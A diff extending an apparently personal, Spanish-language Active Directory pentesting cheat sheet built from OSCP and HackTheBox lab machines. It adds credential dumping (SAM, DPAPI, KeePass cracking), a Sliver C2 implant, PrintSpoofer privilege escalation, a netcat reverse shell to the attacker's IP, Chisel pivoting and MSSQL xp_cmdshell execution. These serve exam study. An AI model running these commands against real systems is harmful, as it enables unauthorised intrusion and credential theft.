@@ -128,6 +128,34 @@ nxc smb <IP> -u users_generated.txt -p '' 2>&1 | grep -v "STATUS_LOGON_FAILURE"
 
 ---
 
+### Enumeración de usuarios por fuerza bruta de SIDs (`lookupsid`)
+
+Alternativa más cuando `rpcclient enumdomusers` o LDAP no te dan la lista completa — `lookupsid` fuerza bruta los RIDs (los números al final del SID) contra el canal LSA, y suele revelar usuarios que otros métodos no muestran, incluso con una cuenta de bajo privilegio como `guest`:
+
+```bash
+impacket-lookupsid <dominio>/<user>:'<pass>'@<IP>
+# Con guest y password vacío: impacket-lookupsid cicada.htb/guest:''@<IP>
+```
+Te devuelve TODO: usuarios, grupos, cuentas de máquina — con su RID. Es otra fuente más para cruzar, además de RPC y LDAP (ver Fase 3).
+
+### 🔴 `smbclient`/`cat` con nombres de archivo que tienen ESPACIOS
+
+Si `ls` dentro de `smbclient` te muestra un archivo como `Notice from HR.txt` (con espacios), **`get Notice from HR.txt` sin comillas falla** — la shell/smbclient interpreta cada palabra como un argumento separado, buscando un archivo llamado literalmente `Notice`.
+
+```
+# MAL — busca un archivo llamado "Notice", no existe:
+smb: \> get Notice from HR.txt
+
+# BIEN — todo el nombre entre comillas:
+smb: \> get "Notice from HR.txt"
+```
+Mismo problema aplica a `cat` en Kali una vez descargado:
+```bash
+cat 'Notice from HR.txt'      # comillas, no cat Notice from HR.txt
+```
+
+---
+
 ## FASE 2 — Explotación de hallazgos comunes SIN credenciales de dominio
 
 ### GPP / Group Policy Preferences — credenciales cifradas en Groups.xml
@@ -148,6 +176,55 @@ nxc smb <IP> -u users.txt -p ''
 nxc smb <IP> -u users.txt -p 'Password123'
 # OJO: puede bloquear cuentas si hay política de lockout agresiva.
 ```
+
+### Otros patrones reales de credenciales en texto plano (además de GPP)
+
+**1. Notas de "bienvenida"/onboarding en shares legibles por Guest/anónimo** — a veces literalmente un `.txt` con el password por defecto de una cuenta nueva:
+```bash
+smbclient //<IP>/<share> -U 'Guest'    # probar con Guest, no solo -N anónimo puro
+smb: \> get "Notice from HR.txt"       # revisa TODO, incluso lo que suena a "recursos humanos"
+```
+
+**2. El campo "Description" de un usuario, visible en la enumeración normal con `nxc --users`** — a veces alguien dejó la contraseña ahí mismo, literalmente en la columna de descripción:
+```bash
+nxc smb <IP> -u '<user>' -p '<pass>' --users
+# Lee la columna -Description- de CADA usuario, no solo el nombre — es fácil
+# pasarla por alto si solo miras la lista de usernames.
+```
+
+**3. Scripts de automatización (`.ps1`, `.bat`) en shares, con credenciales hardcodeadas** — común en scripts de backup/sync que necesitan autenticarse sin intervención humana:
+```powershell
+# Dentro de un .ps1 descargado, busca patrones como:
+# $password = ConvertTo-SecureString "..." -AsPlainText -Force
+```
+
+**4. Bases de datos de KeePass (`.kdbx`) en shares** — un gestor de passwords cifrado, con varias cuentas guardadas dentro. Crackearlo te da de golpe varias credenciales a la vez.
+```bash
+# keepass2john (de John Jumbo) SOLO soporta KDBX v2/v3 — con v4 falla con
+# "File version '40000' is currently not supported!" — no pierdas tiempo ahí.
+
+# Para KDBX v4, usa keepass4brute (ataca el archivo real con una wordlist,
+# sin necesitar generar un hash intermedio):
+sudo apt install keepassxc -y        # trae keepassxc-cli, que keepass4brute necesita
+git clone https://github.com/r3nt0n/keepass4brute
+cd keepass4brute
+chmod +x keepass4brute.sh
+./keepass4brute.sh /ruta/al/archivo.kdbx /usr/share/wordlists/rockyou.txt
+```
+
+**Una vez crackeado, lista y extrae las entradas guardadas:**
+```bash
+keepassxc-cli ls /ruta/al/archivo.kdbx            # lista los nombres de entradas
+keepassxc-cli show /ruta/al/archivo.kdbx "<ENTRADA>" -s   # -s muestra el password (oculto por defecto)
+```
+> Las entradas pueden tener nombres de persona, pero **el password de una entrada no necesariamente pertenece al usuario de dominio con el mismo nombre** — prueba TODOS los passwords extraídos contra TODOS los usuarios conocidos:
+> ```bash
+> nxc smb <IP> -u users.txt -p passwords_extraidos.txt
+> ```
+
+Cada credencial nueva que encuentres por cualquiera de estas 4 vías: **pruébala de inmediato contra shares nuevos** — suele destapar el siguiente share con más acceso (patrón real: cred #1 → share con solo lectura nuevo → script/kdbx con cred #2 → shell).
+
+> 🔴 **Regla de comillas en bash (te va a pasar con CUALQUIER password que tenga `!`, `$`, `` ` ``, o espacios):** usa SIEMPRE comillas simples `'...'` para passwords, nunca dobles `"..."`. Las dobles permiten expansión de variables (`$algo`) e historial de comandos (`!algo`), lo que rompe el comando o deja la terminal colgada esperando más input (`dquote>` o `>` suelto). Si tu terminal se queda en `dquote>`, escribe una comilla sola y Enter para cerrarla, o `Ctrl+C`.
 
 ---
 
@@ -552,6 +629,80 @@ Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\root.txt C:\ruta\desti
 
 ---
 
+## FASE 5g — Volcar SAM/SYSTEM LOCAL (cuando necesitas el hash NTLM, no solo el texto plano)
+
+Caso real (máquina Cicada). A veces el lab/examen pide específicamente **el hash NTLM** de una cuenta local (no la flag en texto, no una password de dominio) — típicamente cuando ya tienes shell con privilegios suficientes en una máquina standalone o miembro, y quieren que demuestres que puedes extraer credenciales locales del SAM.
+
+```powershell
+# Desde tu shell de Windows (necesitas privilegios de admin local, o SeBackupPrivilege)
+reg save HKLM\SAM C:\ruta\sam.bak
+reg save HKLM\SYSTEM C:\ruta\system.bak
+```
+`SYSTEM` contiene la "bootKey" necesaria para descifrar los hashes guardados en `SAM` — por eso necesitas AMBOS archivos, uno sin el otro no sirve.
+
+```powershell
+# Tráelos a tu Kali (recuerda el bug de barras de evil-winrm: usa "/" si hace falta)
+download sam.bak
+download system.bak
+```
+
+```bash
+# En Kali, decodifica localmente — "LOCAL" al final le dice a secretsdump que
+# no se conecte a nada por red, que lea los archivos que le diste
+impacket-secretsdump -sam sam.bak -system system.bak LOCAL
+```
+**Resultado:** hashes NTLM de TODAS las cuentas locales de esa máquina (`Administrator`, `Guest`, etc.), en el formato `usuario:RID:LMHASH:NTHASH:::` — el `NTHASH` (la segunda parte larga) es lo que normalmente pide el lab/examen.
+
+> Esta es una técnica DISTINTA a DCSync (Fase 9) — DCSync te da hashes del DOMINIO completo vía replicación; esto te da hashes LOCALES de una sola máquina, sin necesitar ningún privilegio de dominio ni edge de BloodHound, solo acceso de administrador local (o `SeBackupPrivilege`, que es justo lo que permite el `reg save` saltándose la ACL normal — mismo privilegio de la Fase 5e, aplicado aquí a claves del registro en vez de archivos).
+
+---
+
+## FASE 5h — DPAPI: extraer credenciales guardadas de Windows (Credential Manager)
+
+Caso real (máquina Puppy). Cuando un usuario guarda una credencial en Windows (ej: "Remember my password" en un login de red, o `cmdkey`/Credential Manager), Windows la cifra con **DPAPI** (Data Protection API) y la guarda en disco — pero cifrada con una clave que a su vez está cifrada con la password del propio usuario. Son DOS archivos distintos los que necesitas, de DOS carpetas distintas:
+
+```powershell
+# 1. Los blobs de credenciales cifradas (lo que quieres descifrar)
+dir C:\Users\<usuario>\AppData\Local\Microsoft\Credentials\ -Force
+dir C:\Users\<usuario>\AppData\Roaming\Microsoft\Credentials\ -Force
+# -Force es NECESARIO: estas carpetas y sus archivos suelen tener atributos
+# Hidden + System, Get-ChildItem normal no los muestra.
+
+# 2. La "masterkey" que descifra esos blobs — en una carpeta DISTINTA
+dir C:\Users\<usuario>\AppData\Roaming\Microsoft\Protect\<SID_DEL_USUARIO>\ -Force
+# Dentro hay un archivo con nombre tipo GUID (ej: 0a1b2c3d-...) — esa es la masterkey cifrada.
+```
+
+**Necesitas el SID del usuario para la ruta de la masterkey** (el nombre de la carpeta dentro de `Protect\`):
+```powershell
+whoami /user
+# o: wmic useraccount where name='<usuario>' get sid
+```
+
+### Traer ambos archivos a Kali
+
+> 🔴 **Bug real de evil-winrm con estos archivos — `Error: Download failed. Check filenames or paths: uninitialized constant WinRM::FS::FileManager::EstandardError`** — esto NO es un error tuyo de sintaxis ni de ruta. Es un bug confirmado dentro del propio código de evil-winrm (un typo real: `EstandardError` en vez de `StandardError`) que se dispara específicamente al intentar descargar archivos con atributos **Hidden + System** (justo lo que son los blobs de credenciales y las masterkeys). `Copy-Item` a una ruta sin esos atributos antes de descargar puede ayudar, pero no es 100% confiable. **La solución que sí funciona de forma consistente: usar Sliver C2 en vez de evil-winrm para este paso puntual** (ver Fase 6b) — su comando `download` no tiene este bug.
+
+### Descifrar con impacket-dpapi
+
+```bash
+# 1. Descifrar la masterkey (necesitas la password en texto plano del usuario dueño)
+impacket-dpapi masterkey -file '<archivo_masterkey_GUID>' -sid '<SID_DEL_USUARIO>' -password '<password_del_usuario>'
+# Output: una "decrypted key" en hex — esa es la clave real que descifra los blobs.
+```
+
+```bash
+# 2. Con la masterkey ya descifrada (el hex del paso anterior), descifrar el blob de credencial
+impacket-dpapi credential -file '<archivo_blob_de_Credentials>' -key '<hex_de_la_masterkey_descifrada>'
+# Output: usuario y password en texto plano guardados originalmente en Credential Manager.
+```
+
+> Si el usuario dueño de la masterkey tiene cuenta de **dominio** (no local), también puedes descifrar la masterkey con la clave de respaldo del DC (`-pvk`) en vez de la password del usuario — útil si no conoces esa password en texto plano pero sí tienes privilegios de dominio suficientes para extraer la domain backup key. Esto no fue necesario en el caso real (sí se tenía la password del usuario), pero es la alternativa documentada por impacket para este mismo comando.
+
+> **Cuándo pensar en DPAPI:** viste en BloodHound o por enumeración que un usuario tiene `GenericAll`/edges hacia otro, entraste con su shell, y en vez de una flag directa encontraste carpetas `Credentials\` o `Protect\` con contenido — es señal de que ese usuario guardó credenciales de OTRA cuenta en el Credential Manager de Windows, y esa es la cred que realmente necesitas para seguir la cadena.
+
+---
+
 ## FASE 6 — Movimiento lateral
 
 ```bash
@@ -571,7 +722,15 @@ impacket-wmiexec <dominio>/<user>:<pass>@<IP>      # vía WMI (más discreto)
 
 > 🔴 **Señal de alerta #1 — `Errno::ECONNREFUSED` en 5985:** el puerto está cerrado. Cambia inmediatamente a psexec/wmiexec, no reintentes evil-winrm.
 
-> 🔴 **Señal de alerta #2 — WinRM conecta (ves el prompt `PS C:\>`) pero CUALQUIER comando da `WinRMAuthorizationError`:** las credenciales son correctas, pero ese usuario NO está en el grupo "Remote Management Users". Vi esto pasar en 2 de 3 máquinas, con 2 cuentas de servicio distintas (`svc-alfresco` en Forest, y otro caso en Sauna). **No es un error tuyo — esa cuenta simplemente no tiene autorización de ejecución vía WinRM, aunque autentique.** Prueba con SMB (psexec/wmiexec) en su lugar; si SMB también rechaza (`STATUS_LOGON_FAILURE`), no es autorización, son las credenciales (ver alerta #3).
+> 🔴 **Señal de alerta #2 — WinRM conecta (ves el prompt `PS C:\>`) pero CUALQUIER comando da `WinRMAuthorizationError`:** hay AL MENOS DOS causas distintas con el mismo síntoma — no asumas cuál es sin verificar:
+> 1. **El usuario NO está en el grupo "Remote Management Users"** (visto en Forest con `svc-alfresco`, y en Sauna). Solución: si tienes un ACL útil (GenericWrite/GenericAll sobre un grupo), agrégate tú mismo a "Remote Management Users", o al grupo correspondiente.
+> 2. **La cuenta tiene la bandera `ACCOUNTDISABLE` activa en su `userAccountControl`** (visto en Puppy con `adam.silver`) — aunque esté en el grupo correcto, una cuenta deshabilitada da exactamente el mismo error. Verifica primero con `whoami /groups` desde OTRA cuenta que sí tenga acceso (ver Fase 6, "cuando una cuenta no funciona, lee de otra con permiso"), y si sospechas esto, quítale la bandera con `bloodyAD`:
+>    ```bash
+>    bloodyAD --host <IP> -d <dominio> -u '<tu_usuario>' -p '<tu_pass>' remove uac '<cuenta_objetivo>' -f ACCOUNTDISABLE
+>    ```
+>    (requiere que tengas GenericWrite/GenericAll sobre esa cuenta — el mismo tipo de ACL que te permitiría resetear su password)
+>
+> Prueba con SMB (psexec/wmiexec) en su lugar si no logras resolverlo por ninguna de las dos vías; si SMB también rechaza (`STATUS_LOGON_FAILURE`), no es autorización, son las credenciales (ver alerta #3).
 
 > 🔴 **Señal de alerta #3 — 2+ protocolos distintos (SMB, LDAP, WinRM) rechazan la MISMA credencial de forma consistente con LOGON_FAILURE:** sospecha del dato copiado, no de la configuración. Reescribe usuario Y password a mano.
 
@@ -581,6 +740,306 @@ impacket-wmiexec <dominio>/<user>:<pass>@<IP>      # vía WMI (más discreto)
 > nxc winrm <IP> -u '<user>' -p '<pass>' --local-auth
 > ```
 > Si Kerberos da `KDC_ERR_C_PRINCIPAL_UNKNOWN (Client not found in Kerberos database)`, el principal no existe como cuenta de DOMINIO con ese nombre exacto — verifica el username (ver Fase 7).
+
+---
+
+## FASE 6b — Sliver C2 como alternativa a evil-winrm (cuando `download`/`upload` fallan)
+
+Caso real (máquina Puppy). Cuando evil-winrm falla de forma consistente para transferir un archivo específico (típicamente por el bug `EstandardError` con Hidden+System, Fase 5h), **Sliver** es un framework C2 que puede sustituir completamente a evil-winrm como shell — su implante es más robusto para este tipo de operaciones de archivo. No es exclusivo para esto (es un C2 completo), pero aquí se documenta el flujo mínimo para usarlo solo como "shell alternativa para un download problemático".
+
+> Confusión real de nombre: es **Sliver** (el framework), no "Silver" — no tiene relación con ningún usuario que se llame parecido en la máquina.
+
+### Instalación — dos binarios, no uno
+
+```bash
+sudo apt install sliver -y
+which sliver
+# → no existe ningún comando "sliver" unificado. El paquete instala DOS binarios
+# separados: sliver-server y sliver-client. Usa esos nombres exactos.
+```
+
+### Levantar el servidor y crear un operador (necesario para que el cliente conecte)
+
+```bash
+# 1. Arranca el servidor (deja esta terminal abierta, es su consola interactiva)
+sudo sliver-server
+```
+
+```bash
+# 2. DESDE OTRA terminal, genera un perfil de "operador" — sliver-client no conecta
+#    sin esto, y falla con "No config files found" si lo omites.
+#    --permissions es OBLIGATORIO (valores válidos: all, builder, crackstation)
+sudo sliver-server operator --name <tu_nombre> --lhost localhost --save /tmp/operator.cfg --permissions all
+
+# El archivo queda con permisos root-only porque se generó con sudo — dale lectura:
+sudo chmod +r /tmp/operator.cfg
+```
+
+```bash
+# 3. DENTRO de la consola de sliver-server (la terminal del paso 1), activa el
+#    listener multiplayer — sin esto, sliver-client falla con
+#    "Connection to server failed: context deadline exceeded" aunque el config esté bien.
+multiplayer
+```
+
+```bash
+# 4. Ahora sí, conecta el cliente usando el config generado
+sliver-client /tmp/operator.cfg
+```
+
+### Generar el implante y levantar un listener para recibir la conexión
+
+```bash
+# Dentro de la consola de sliver-client/sliver-server:
+
+# Listener mTLS — usa tu IP de la VPN (tun0), NO tu IP de red local
+mtls --lhost <TU_IP_TUN0>
+
+# Genera el implante apuntando a ese listener
+generate --mtls <TU_IP_TUN0> --save /tmp/implante.exe
+```
+
+> 🔴 **El `.exe` generado queda root-only si corriste `sliver-server` con `sudo`** — igual que `operator.cfg`, necesita `chmod +r` antes de poder leerlo/subirlo:
+> ```bash
+> sudo chmod +r /tmp/implante.exe
+> ```
+
+```bash
+# Sube el implante a la máquina objetivo (vía el evil-winrm que SÍ funciona para
+# archivos normales, o vía el share que ya tengas) y ejecútalo ahí:
+```
+```powershell
+C:\ruta\implante.exe
+```
+
+> 🔴 **Si no aparece ninguna sesión tras ejecutar el implante, revisa primero que el listener `mtls` esté activo** (`mtls --lhost <IP>` corrido ANTES de ejecutar/re-ejecutar el implante) — sin listener, el implante se ejecuta pero no tiene a dónde conectar, y no da ningún error visible en Windows.
+
+### Interactuar con la sesión y usar `download`
+
+```bash
+# Dentro de la consola de Sliver:
+sessions                    # lista sesiones activas, con su ID
+use <SESSION_ID>             # entra a interactuar con una sesión específica
+
+# Ya dentro de la sesión, el equivalente a evil-winrm download:
+download 'C:\Users\<usuario>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>' /ruta/local/destino/
+```
+Este `download` de Sliver maneja bien archivos Hidden+System — es justo la razón por la que se usa aquí en vez de evil-winrm.
+
+> 🔴 **Si el implante se mata (`Stop-Process -Name <implante> -Force` en PowerShell, o el proceso termina por cualquier razón), se cierran TODAS las sesiones de Sliver asociadas a ese proceso** — no solo la que tenías abierta. Tienes que volver a ejecutar el `.exe` en Windows para obtener una sesión nueva. Evita matar el proceso del implante a propósito salvo que ya hayas terminado con él.
+
+> 🔴 **Sesiones duplicadas con el mismo timestamp:** si el implante se ejecuta más de una vez (ej: por error, o porque un script lo relanza), Sliver muestra varias sesiones separadas aunque sean "la misma" conexión lógica — usa `sessions` para ver cuál sigue viva y cuál ya murió antes de hacer `use`.
+
+---
+
+## FASE 6c — Privesc local a SYSTEM: `SeImpersonatePrivilege` + PrintSpoofer
+
+Caso real (Challenge Lab OSCP A, máquina MS01). Esto es DISTINTO a todo lo visto hasta ahora en esta guía — no es un ataque de AD (no toca Kerberos, LDAP, ni ACLs del dominio), es **escalada de privilegios LOCAL en una sola máquina Windows**, y reaparece constantemente en el examen real porque Windows le da este privilegio a muchas cuentas de servicio/aplicación sin que nadie se dé cuenta del riesgo.
+
+**Por qué funciona — el concepto:** `SeImpersonatePrivilege` le permite a tu proceso "impersonar" (tomar la identidad) de cualquier cliente que se conecte a él — **incluyendo SYSTEM**, si logras que un proceso SYSTEM se conecte a algo que tú controlas. La familia de exploits "Potato" (PrintSpoofer, GodPotato, RoguePotato, JuicyPotato) automatiza esto: engañan a un servicio SYSTEM (el spooler de impresión, DCOM, BITS...) para que se autentique contra un named pipe que tú creaste, y usan tu privilegio para capturar ese token de SYSTEM.
+
+**Primera pista — revisa SIEMPRE `whoami /priv` apenas tengas shell, antes de cualquier otra cosa:**
+```powershell
+whoami /priv
+```
+Busca `SeImpersonatePrivilege` con estado `Enabled`. Es extremadamente común en cuentas de servicio y cuentas bajo las que corre una aplicación web (IIS, Apache con un usuario dedicado, etc.) — exactamente el perfil de una cuenta como `Eric.Wallows` en un escenario de "assumed breach".
+
+**Explotación con PrintSpoofer (abusa el servicio Spooler de impresión, casi siempre activo):**
+```bash
+# Descárgalo en Kali (binario público, PoC bien documentado — permitido en el examen
+# igual que Certipy o impacket, no es un framework de explotación automatizada):
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+# Alternativa si esa URL cambia de nombre:
+wget https://github.com/jakobfriedl/precompiled-binaries/raw/main/PrintSpoofer64.exe
+```
+```
+upload PrintSpoofer64.exe
+```
+```powershell
+.\PrintSpoofer64.exe -i -c cmd
+```
+
+> 🔴 **El `cmd` interactivo que lanza NO sirve sobre evil-winrm** — evil-winrm no tiene un pty real, así que el proceso se crea y queda vivo en el sistema, pero tú vuelves inmediatamente al prompt de PowerShell normal sin poder escribirle. No es que el exploit haya fallado (`CreateProcessAsUser() OK` confirma que SÍ obtuviste el token de SYSTEM) — es una limitación de la shell, no del exploit.
+
+**Solución — ejecuta comandos puntuales como SYSTEM, redirigiendo la salida a un archivo que luego lees tú mismo:**
+```powershell
+.\PrintSpoofer64.exe -c "cmd /c whoami > C:\Users\<tu_usuario>\Documents\out.txt 2>&1"
+Start-Sleep -Seconds 2
+type C:\Users\<tu_usuario>\Documents\out.txt
+```
+Debe mostrar `nt authority\system`.
+
+> 🔴 **`Start-Sleep` es obligatorio, no cosmético:** `CreateProcessAsUser()` lanza el proceso y PrintSpoofer regresa el control a tu shell de inmediato, SIN esperar a que el proceso termine de escribir el archivo. Si haces `type` sin pausa, el archivo todavía no existe o está vacío. 2 segundos suelen bastar para un comando simple; si el comando tarda más (ej: `dir /s` en un árbol grande), sube el sleep.
+
+> 🔴 **Usa SIEMPRE una ruta de tu propio usuario (`C:\Users\<tu_usuario>\Documents\`), NUNCA `C:\Windows\Temp\` para el archivo de salida que vas a leer después.** SYSTEM sí puede escribir en `C:\Windows\Temp\`, pero el archivo queda con una ACL que tu usuario normal no puede leer después — te da `Access is denied` al intentar el `type`, aunque el comando como SYSTEM haya funcionado perfecto. En tu propia carpeta, como ya tienes permisos completos, no hay ese problema.
+
+**Para una shell de SYSTEM real e interactiva (si necesitas hacer varias cosas, no solo un comando puntual):**
+```bash
+# En Kali:
+sudo nc -lvnp 4444
+```
+```powershell
+.\PrintSpoofer64.exe -c "C:\ruta\nc64.exe -e cmd.exe <TU_IP_VPN> 4444"
+```
+
+**Por qué esto vale la pena documentar aparte de todo lo de AD:** una vez tienes SYSTEM, tienes acceso de lectura TOTAL al sistema de archivos local — útil no solo para leer flags de cualquier usuario, sino para la Fase 6e (leer código fuente de apps web en busca de credenciales) y para extraer SAM/SYSTEM/SECURITY locales (Fase 5g) sin depender de ningún privilegio de dominio.
+
+---
+
+## FASE 6d — Pivoting a una segunda red con Chisel + proxychains
+
+Caso real (Challenge Lab OSCP A). Esto aplica cuando enumeras la red y encuentras una máquina con **dos tarjetas de red** (dual-homed) — una en tu subred, otra en una subred interna a la que no tienes ruta directa (típicamente donde vive el DC en un set de AD). La máquina dual-homed es tu **pivote**: necesitas que TU tráfico pase a través de ELLA para llegar a la segunda red.
+
+**Primero, confirma que la máquina es dual-homed:**
+```powershell
+ipconfig /all
+```
+Busca una SEGUNDA interfaz con IP en un rango distinto al que ya conoces (ej: tienes shell en `192.168.x.x` y ves también una interfaz en `10.10.x.x`). El `DNS Servers` de esa segunda interfaz suele ser el DC de esa red.
+
+**Concepto de Chisel:** el cliente (que corre en la máquina pivote, dentro de la red Windows) abre una conexión SALIENTE hacia tu Kali. Por ese mismo canal, levantas un proxy SOCKS del lado de tu Kali. Así, cualquier herramienta tuya (nxc, impacket, bloodhound-python) puede alcanzar la segunda red como si estuvieras ahí, aunque tu Kali no tenga ruta real — todo pasa por el túnel.
+
+```bash
+# 1. Instala/descarga Chisel — necesitas DOS binarios: uno Linux (tu Kali), uno Windows (la víctima)
+sudo apt install chisel -y
+# Si no está en apt, o necesitas el binario de Windows:
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
+gunzip chisel_1.9.1_windows_amd64.gz
+mv chisel_1.9.1_windows_amd64 chisel.exe
+chmod +x chisel.exe
+```
+```bash
+# 2. Levanta el servidor en tu Kali
+chisel server -p 8000 --reverse
+```
+```
+upload chisel.exe
+```
+```powershell
+# 3. Cliente en la víctima, apuntando a TU IP real de VPN (no un placeholder — verifícala con "ip a | grep tun0")
+.\chisel.exe client <TU_IP_VPN_REAL>:8000 R:socks
+```
+> Si ya tienes SYSTEM por la Fase 6c, puedes lanzar esto vía `PrintSpoofer64.exe -c "..."` igual que cualquier otro comando, aunque para el túnel en sí el nivel de privilegio no es lo crítico — lo que importa es que la máquina pueda alcanzar la red interna.
+
+**4. Confirma la conexión en la terminal donde corre `chisel server`** — debe aparecer algo como:
+```
+server: session#1: tun: proxy#1:R:127.0.0.1:1080=>socks: Listening
+```
+Si no aparece nada, el cliente no conectó — revisa que usaste tu IP real, no un placeholder.
+
+**5. Configura proxychains (`/etc/proxychains4.conf`), reemplazando la línea default de Tor por la tuya:**
+```
+# comenta o borra esta línea:
+#socks4  127.0.0.1 9050
+# y agrega:
+socks5 127.0.0.1 1080
+```
+
+**6. Antepone `proxychains` a CUALQUIER herramienta que necesite llegar a la red interna:**
+```bash
+proxychains nxc smb 10.10.x.x
+proxychains impacket-GetUserSPNs ...
+```
+
+### 🔴 Limitaciones del túnel que cuestan tiempo si no las conoces
+
+**UDP no se tuneliza — solo TCP.** Dos consecuencias prácticas:
+- `ntpdate` (para sincronizar reloj, Fase 8/checklist #12) usa NTP sobre UDP → falla por timeout a través de proxychains. **Solución:** usa `faketime` con un offset calculado a mano a partir de un desfase ya conocido (ej: el que viste en un `ssl-date` de nmap contra otra máquina del mismo lab), o un timestamp absoluto:
+  ```bash
+  TS=$(date -d '+7 hours' '+%Y-%m-%d %H:%M:%S')
+  faketime "$TS" proxychains impacket-GetUserSPNs ...
+  ```
+  (`faketime '+7h'` directo puede fallar con "invalid date" según la versión — el timestamp absoluto calculado con `date -d` es más confiable.)
+- `bloodhound-python` resuelve registros SRV por DNS sobre UDP por defecto → falla con `dns.resolver.LifetimeTimeout`. **Solución:** fuerza DNS sobre TCP con el flag `--dns-tcp`:
+  ```bash
+  proxychains bloodhound-python -u <user> -p '<pass>' -d <dominio> -ns <IP_DC> -c all --zip --dns-tcp
+  ```
+- Para resolver un hostname puntual (ej: averiguar la IP de otra máquina del dominio por su nombre), usa `dig +tcp` en vez de `dig`/`nslookup` normal:
+  ```bash
+  proxychains dig +tcp <hostname> @<IP_DC>
+  ```
+
+**`nmap` sobre proxychains da falsos negativos.** `nmap` (sobre todo con `--min-rate` alto) abre muchas conexiones en paralelo con sockets no bloqueantes, y proxychains-ng no los maneja bien a través de un solo canal SOCKS — el resultado puede decir "todos los puertos filtered" aunque estén abiertos. **No confíes en ese resultado.** Verifica con herramientas de una sola conexión TCP limpia:
+```bash
+proxychains nxc smb <IP>              # confirma 445 de forma confiable
+proxychains nc -nvz -w5 <IP> <puerto> # confirma cualquier puerto puntual
+```
+Si necesitas igual usar nmap, bájale mucho la velocidad y limita los puertos: `nmap -sT -Pn -T2 --max-retries 1 -p <puertos_específicos> <IP>` — reduce falsos negativos pero no los elimina del todo; `nc`/`nxc` siguen siendo más confiables.
+
+---
+
+## FASE 6e — Credenciales en código fuente de apps web + privesc en MSSQL (impersonation)
+
+Caso real (Challenge Lab OSCP A). Dos técnicas que se encadenan naturalmente cuando ya tienes SYSTEM en una máquina que corre una app web custom (Fase 6c) y necesitas credenciales para seguir avanzando hacia otra máquina (ej: un servidor MSSQL).
+
+### Localizar el código fuente de la app
+
+Un banner de nmap tipo `Apache httpd (Win64) PHP/...` en Windows casi siempre es **WAMP** o **XAMPP**, no IIS — no asumas la ruta, confírmala:
+```powershell
+# Busca un archivo HTML que ya sepas que existe (visto antes con feroxbuster, por ejemplo)
+where /r C:\ Home.html
+# o busca el archivo de configuración de Apache directamente
+where /r C:\ httpd.conf
+```
+Con la ruta del `httpd.conf`, lee el archivo de vhosts (`conf\extra\httpd-vhosts.conf` en la misma instalación) — ahí ves el `DocumentRoot` EXACTO de cada sitio/puerto, que puede no ser el mismo directorio para todos los puertos de Apache en la misma máquina (ej: puerto 80 → `C:\wamp64\www`, puerto 81 → `C:\wamp64\attendance`, dos apps completamente distintas).
+
+### Buscar credenciales en el código
+
+```powershell
+# Busca archivos de conexión a BD por nombre típico, y por contenido
+dir C:\wamp64\<carpeta_app> /s /b
+findstr /si /m password C:\wamp64\<carpeta_app>\*.php
+type C:\wamp64\<carpeta_app>\conn.php
+```
+
+> **Las credenciales que encuentres aquí pueden ser para una base de datos LOCAL** (ej: `mysqli('localhost', 'root', '', 'apsystem')` — root local sin password, para MySQL/MariaDB corriendo en la misma máquina), que no sirve directo para moverte a otra máquina, pero sí es una mina de passwords para probar por **reutilización** contra cuentas reales de dominio: vuelca las tablas de usuarios/admin de esa base de datos local, y prueba cualquier password que encuentres contra las cuentas de AD que aún no tengas (ej: una cuenta "admin" del panel web con el mismo password que el usuario de dominio del mismo nombre).
+
+```powershell
+# Ubica el binario de mysql/mariadb (WAMP trae ambos, confirma cuál aplica)
+where /r C:\wamp64 mysql.exe
+# Vuelca las tablas de la BD de la app
+<ruta_mysql.exe> -u root <nombre_bd> -e "show tables;"
+<ruta_mysql.exe> -u root <nombre_bd> -e "SELECT * FROM <tabla_admin>;"
+```
+
+### MSSQL — cadena de impersonation (`EXECUTE AS`) cuando tu cuenta no es sysadmin
+
+Si en vez de (o además de) MySQL local encuentras un servidor **MSSQL** (puerto 1433, típicamente revelado por un SPN tipo `MSSQL/<host>.dominio` en un Kerberoast — Fase 5), conéctate con tus credenciales de dominio vía autenticación integrada de Windows:
+
+```bash
+proxychains impacket-mssqlclient <dominio>/<user>:'<pass>'@<IP> -windows-auth
+```
+
+> ⚠️ **`impacket-mssqlclient` ejecuta cada LÍNEA como un comando independiente** — no acumula un query multi-línea como un editor SQL normal. Cualquier query debe ir TODO en una sola línea.
+
+Verifica primero tu nivel real:
+```sql
+SELECT SYSTEM_USER;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+```
+Si da `0`, no eres sysadmin — pero antes de abandonar esa cuenta, revisa si puedes **impersonar** a otro login sin necesitar su password (el equivalente en MSSQL a un ACL de AD, pero dentro del motor de base de datos):
+
+```sql
+SELECT a.name AS login_con_permiso, b.name AS puede_impersonar_a FROM sys.server_permissions AS perm INNER JOIN sys.server_principals AS a ON perm.grantee_principal_id = a.principal_id INNER JOIN sys.server_principals AS b ON perm.grantor_principal_id = b.principal_id WHERE perm.permission_name = 'IMPERSONATE';
+```
+Esto te muestra TODOS los permisos de impersonation del servidor, aunque no tengas visibilidad completa de otros principals por separado. Si tu login aparece con `puede_impersonar_a` algo jugoso (ej: `sa`):
+```sql
+EXECUTE AS LOGIN = '<login_objetivo>';
+SELECT IS_SRVROLEMEMBER('sysadmin');
+```
+
+Si da vacío/nada útil, revisa también qué heredas de tus propios grupos de Windows — una cuenta de dominio autenticada vía `-windows-auth` hereda permisos de TODOS los grupos de AD a los que pertenece, no solo los suyos directos:
+```sql
+SELECT * FROM fn_my_permissions(NULL, 'SERVER');
+SELECT * FROM sys.login_token;
+```
+`sys.login_token` lista cada grupo de Windows detrás de tu sesión — si alguno de esos grupos (ej: un grupo custom como `admin`, `IT` que viste en LDAP) tiene sysadmin otorgado a nivel de MSSQL, aparece aquí aunque tu usuario individual no tenga nada directo.
+
+**Una vez confirmado sysadmin (por cualquiera de las dos vías), RCE vía `xp_cmdshell`:**
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+```
 
 ---
 
@@ -892,22 +1351,30 @@ type tmp.hex
 
 > 🔴 **Si `dir` en cmd muestra warnings de "Decoding error, consider running chcp.com"** (típico con `impacket-wmiexec`) — no afecta el contenido real del archivo, es solo un problema de codificación de caracteres en la consola. El `type` del archivo sigue siendo confiable.
 
